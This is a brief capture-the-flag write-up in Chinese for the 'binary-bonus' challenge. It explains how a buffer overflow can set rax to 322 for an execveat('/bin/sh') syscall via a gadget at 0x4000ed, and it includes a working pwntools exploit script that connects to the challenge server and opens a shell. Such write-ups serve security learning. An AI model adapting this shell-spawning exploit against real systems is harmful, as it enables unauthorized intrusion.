### binary-bonus

本題僅能控`rax` (syscall 0 return 1 ~ 0x148)以及`rsi`，查syscall表查到唯一可用為`execveat(0, "/bin/sh", 0, 0, 0)`，故buffer overflow時先寫入`"/bin/sh"`及調整`rax`為`322`，接著在`ret`的位置寫入`0x4000ed`(不能直接跳到syscall，要先將`rdx`清空)

#### exploit
```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux')

payload = b'/bin/sh\x00'
payload += cyclic(296 - len(payload)).encode()
payload += p64(0x4000ED) # xor rdx, rdx; syscall
payload += cyclic(321 - len(payload)).encode()

r = remote('pwnhub.tw', 55688)
r.sendline(payload)
r.interactive()
```
